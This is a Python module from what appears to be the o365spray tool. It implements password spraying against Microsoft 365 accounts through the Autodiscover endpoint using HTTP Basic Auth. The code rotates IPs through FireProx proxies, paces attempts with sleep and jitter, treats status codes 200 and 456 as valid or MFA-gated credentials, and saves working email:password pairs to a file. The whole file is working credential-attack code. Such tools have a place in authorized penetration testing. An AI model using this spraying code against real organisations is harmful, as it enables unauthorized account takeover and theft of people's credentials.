#!/usr/bin/env python3

import logging
import time
from requests.auth import HTTPBasicAuth  # type: ignore

from o365spray.core.handlers.sprayer.modules.base import SprayerBase
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)


class SprayModule_autodiscover(SprayerBase):
    """Autodiscover Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_autodiscover, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users on Microsoft using Microsoft Autodiscover

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Grab default headers
            # Updated: copy headers to avoid cross-request mutation.
            headers = Defaults.HTTP_HEADERS.copy()

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/autodiscover/autodiscover.xml"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"

            auth = HTTPBasicAuth(email, password)
            response = self._send_request(
                "get",
                url,
                auth=auth,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
                # Updated: include request context for per-request logging.
                log_context={
                    "module": self.module_tag,
                    "action": "spray",
                    "target": email,
                    "username": user,
                    "password": password,
                },
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for valid responses.
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="Autodiscover auth accepted",
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle accounts that appear valid, but could have another factor
            # blocking full authentication
            elif status == 456:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                # Updated: richer CLI output for conditional results.
                self._log_spray_result(
                    "VALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="Manual confirmation required (MFA/locked/etc.)",
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle Autodiscover errors that are returned by the server
            elif "X-AutoDiscovery-Error" in response.headers.keys():
                # Handle Basic Auth blocking
                if any(
                    str_ in response.headers["X-AutoDiscovery-Error"]
                    for str_ in Defaults.BASICAUTH_ERRORS
                ):
                    # Updated: richer CLI output for basic auth block.
                    self._log_spray_result(
                        "BLOCKED",
                        email,
                        password,
                        status=status,
                        reason=response.reason,
                        detail="Basic Auth blocked",
                    )
                    # Remove basic auth blocked user from being sprayed again
                    self.userlist.remove(user)

                # Handle tenants that are not capable of this type of auth
                elif (
                    "TenantNotProvisioned" in response.headers["X-AutoDiscovery-Error"]
                ):
                    logging.info(
                        "Tenant not provisioned for this type of authentication. Shutting down..."
                    )
                    self.exit = True
                    return self.shutdown()

                # Handle Microsoft AADSTS errors
                else:
                    self._check_aadsts(
                        user,
                        email,
                        password,
                        response.headers["X-AutoDiscovery-Error"],
                        status=status,
                        reason=response.reason,
                    )

            else:
                # Updated: richer CLI output for invalid responses.
                self._log_spray_result(
                    "INVALID",
                    email,
                    password,
                    status=status,
                    reason=response.reason,
                    detail="Autodiscover auth rejected",
                )

        except Exception as e:
            # Updated: surface request failures with context.
            logging.warning(
                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
            )
            pass
